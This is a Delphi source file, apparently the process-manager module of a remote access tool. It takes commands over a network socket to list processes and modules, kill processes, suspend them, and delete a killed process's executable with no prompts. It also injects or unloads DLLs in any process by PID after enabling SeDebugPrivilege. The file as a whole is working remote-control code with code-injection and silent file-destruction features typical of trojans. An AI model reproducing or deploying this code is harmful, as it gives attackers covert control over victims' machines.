unit UnitProcessManager;

interface

uses
  afxcodehook,winsvc,applicationunit,windows,socketunit, unitshareddata, ShlObj,ShFolder,
    ShellAPi, ImageHlp, messages, TLHelp32, psAPI;

type
  P_TokenUser = ^User;
  User = record
    Userinfo: TSidAndAttributes;
  end;
  tUser = User;

const
  THREAD_TERMINATE            = ($0001);
  THREAD_SUSPEND_RESUME       = ($0002);
  THREAD_GET_CONTEXT          = ($0008);
  THREAD_SET_CONTEXT          = ($0010);
  THREAD_SET_INFORMATION      = ($0020);
  THREAD_QUERY_INFORMATION    = ($0040);
  THREAD_SET_THREAD_TOKEN     = ($0080);
  THREAD_IMPERSONATE          = ($0100);
  THREAD_DIRECT_IMPERSONATION = ($0200);
  THREAD_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $3FF);

  function OpenThread(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwThreadId: DWORD): THandle; stdcall; external kernel32 Name 'OpenThread';
  procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ProcessManager|' + Data);
end;

function Getcreationtime(F:_filetime): String;
var
  SysTime:TSystemTime;
  Month,Day,Hour,Minute,Second:String;
begin
  FileTimeToSystemTime(f,Systime);
  month := inttostr(systime.wMonth);
  day := inttostr(systime.wDay);
  hour := inttostr(Systime.wHour +1);
  minute := inttostr(Systime.wMinute);
  Second := inttostr(systime.wSecond);
  if length(month) = 1 then month := '0' + month;
  if length(day) = 1 then day := '0' + day;
  if length(hour) = 1 then hour := '0' + hour;
  if hour = '24' then hour := '00';
  if length(minute) = 1 then minute := '0' + minute;
  if length(second) = 1 then second := '0' + second;
  Result :=  day + '/' + month + '/' + IntTostr(Systime.wYear) + ' ' + hour + ':' + minute + ':' + second;
end;

function LoadLib(PID: integer; Path:string): string;
var
  Ph: integer;
begin
  Ph := OpenProcess(PROCESS_ALL_ACCESS,False,PID);
  InjectLibrary(Ph,Path);
  CloseHandle(Ph);
end;

function UnloadLib(PID: integer; Path:string): string;
var
  Ph: integer;
begin
  Ph := OpenProcess(PROCESS_ALL_ACCESS,False,PID);
  UninjectLibrary(Ph,Path);
  CloseHandle(Ph);
end;

procedure SetTokenPrivileges(Priv: string);
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil,Pchar(Priv), TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function ProcessList: string;
var
  User, Domain,Usage,Created: string;
  proc: TProcessEntry32; snap: THandle;
  mCreationTime,mExitTime,mKernelTime, mUserTime:_FILETIME;
  HToken: THandle;
  rLength: Cardinal;
  ProcUser: P_Tokenuser;
  snu: SID_NAME_USE;
  ProcessHandle: THandle;
  UserSize, DomainSize: DWORD;
  bSuccess: Boolean;
  pmc: TProcessMemoryCounters;
  Buf: array[0..MAX_PATH] of char;
  location: string;
begin
  //
  SetTokenPrivileges('SeDebugPrivilege');
  pmc.cb := SizeOf(pmc) ;
  snap := CreateToolHelp32SnapShot(TH32CS_SNAPALL,0);
  proc.dwSize := SizeOf(TProcessEntry32);

  Process32First(snap, proc);
  repeat
    ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or  PROCESS_VM_READ, False, proc.th32ProcessID);
    if ProcessHandle = 0 then begin
      Result := Result + proc.szExeFile + '|' + inttostr(Proc.th32ProcessID) + '|||' + inttostr(Proc.cntThreads) + '||' + #13#10
    end else begin

      Location := '';
      if GetModuleFileNameEx(ProcessHandle,0,Buf,MAX_PATH) > 0 then Location := Buf;

      if GetProcessMemoryInfo(Processhandle, @pmc, SizeOf(pmc)) then Usage := inttostr(pmc.WorkingSetSize) // div 1024)
      else Usage := '0';

      if GetProcessTimes(Processhandle, mCreationTime, mExitTime, mKernelTime, mUserTime) then Created := Getcreationtime(mcreationtime);

      if OpenProcessToken(ProcessHandle, TOKEN_QUERY, hToken) then begin
        bSuccess := GetTokenInformation(hToken, TokenUser, nil, 0, rLength);
        ProcUser  := nil;
        while (not bSuccess) and (GetLastError = ERROR_INSUFFICIENT_BUFFER) do begin
          ReallocMem(ProcUser,rLength);
          bSuccess:= GetTokenInformation(hToken,TokenUser,ProcUser,rLength,rLength);
        end;
        CloseHandle(hToken);

        UserSize := 0;
        DomainSize := 0;
        LookupAccountSid(nil, ProcUser.Userinfo.Sid, nil, UserSize, nil, DomainSize, snu);
        if (UserSize <> 0) and (DomainSize <> 0) then begin
          SetLength(User, UserSize);
          SetLength(Domain, DomainSize);
          if LookupAccountSid(nil, ProcUser.Userinfo.Sid, PChar(User), UserSize, PChar(Domain), DomainSize, snu) then begin
            User :=PChar(User);
            Domain :=PChar(Domain);
          end;
        end;
        FreeMem(ProcUser);
      end;
      CloseHandle(ProcessHandle);
      Result := Result + Proc.szExeFile + '|';
      Result := Result + inttostr(Proc.th32ProcessID) + '|';
      Result := Result + Location + '|';
      Result := Result + User + '|';
      Result := Result + inttostr(Proc.cntThreads) + '|';
      Result := Result + Usage + '|';
      Result := Result + created + #13#10;
    end;
  until not Process32Next(snap, proc);

  CloseHandle(snap);
end;

function ExtractFileName(FileName: string): string;
begin
  while Pos('\', FileName) <> 0 do Delete(FileName, 1, Pos('\', FileName));
  while Pos('/', FileName) <> 0 do Delete(FileName, 1, Pos('/', FileName));
  Result := FileName;
end;

function ModList(Pid: integer): string;
var
  Module32: TModuleEntry32;
  ModuleSnapshot: THandle;
begin
  ModuleSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPMODULE, Pid);
  Module32.dwSize := SizeOf(TModuleEntry32);
  Module32First(ModuleSnapshot, Module32);
  repeat
    Result := Result + Module32.szExePath + #13#10;
  until not (Module32Next(ModuleSnapshot, Module32));
  CloseHandle(ModuleSnapshot);
end;

function PidToPath(Pid: integer): string;
var
  ProcessHandle: THandle;
  Buf: array[0..MAX_PATH] of char;
begin
  ProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or  PROCESS_VM_READ,   False,Pid);
  GetModuleFileNameEx(ProcessHandle,0,Buf,MAX_PATH);
  Result := String(Buf);
  CloseHandle(ProcessHandle);
end;

function KillProc(Pid: integer): string;
var
  Ph: integer;
begin
  Result := 'Error Ending Process: ' + IntToStr(Pid);
  Ph := OpenProcess(PROCESS_TERMINATE,False,PID);
  if TerminateProcess(Ph,0) then Result := 'Successfully Ended Process: ' + IntToStr(Pid);
  CloseHandle(Ph);
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;


procedure PauseProcess(Pid: integer);
var
  Thread32: TThreadEntry32;
  ThreadSnapshot: THandle;
  ThreadHandle: THandle;
begin
  ThreadSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPTHREAD, Pid);
  Thread32.dwSize := SizeOf(TThreadEntry32);
  Thread32First(ThreadSnapshot, Thread32);
  repeat
    if Thread32.th32OwnerProcessID = Pid then begin
      ThreadHandle := OpenThread(THREAD_ALL_ACCESS,False,Thread32.th32ThreadID);
      SuspendThread(ThreadHandle);
      CloseHandle(ThreadHandle);
    end;
  until not (Thread32Next(ThreadSnapshot, Thread32));
  CloseHandle(ThreadSnapshot);
end;

procedure ResumeProcess(Pid: integer);
var
  Thread32: TThreadEntry32;
  ThreadSnapshot: THandle;
  ThreadHandle: THandle;
begin
  ThreadSnapshot := CreateToolHelp32SnapShot(TH32CS_SNAPTHREAD, Pid);
  Thread32.dwSize := SizeOf(TThreadEntry32);
  Thread32First(ThreadSnapshot, Thread32);
  repeat
    if Thread32.th32OwnerProcessID = Pid then begin
      ThreadHandle := OpenThread(THREAD_ALL_ACCESS,False,Thread32.th32ThreadID);
      ResumeThread(ThreadHandle);
      CloseHandle(ThreadHandle);
    end;
  until not (Thread32Next(ThreadSnapshot, Thread32));
  CloseHandle(ThreadSnapshot);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'ProcessList' then begin
    SendData(Socket,Command + '|' + inttostr(GetCurrentProcessId) + '|' + ProcessList);
  end;

  if Command = 'ModuleList' then begin
    SendData(Socket,Command + '|' + ModList(strtoint(Data)));
  end;

  if Command = 'End' then begin
    KillProc(strtoint(Data));
  end;

  if Command = 'EndDelete' then begin
    KillProc(strtoint(Data));
    DeleteDirectory(PidToPath(strtoint(Data)));
  end;

  if Command = 'Suspend' then begin
    PauseProcess(strtoint(Data));
  end;

  if Command = 'Resume' then begin
    ResumeProcess(strtoint(Data));
  end;

  if Command = 'LoadModule' then begin
    LoadLib(strtoint(split(Data,'|',1)),split(Data,'|',2));
  end;

  if Command = 'UnloadModule' then begin
    UnloadLib(strtoint(split(Data,'|',1)),split(Data,'|',2));
  end;


end;


end.
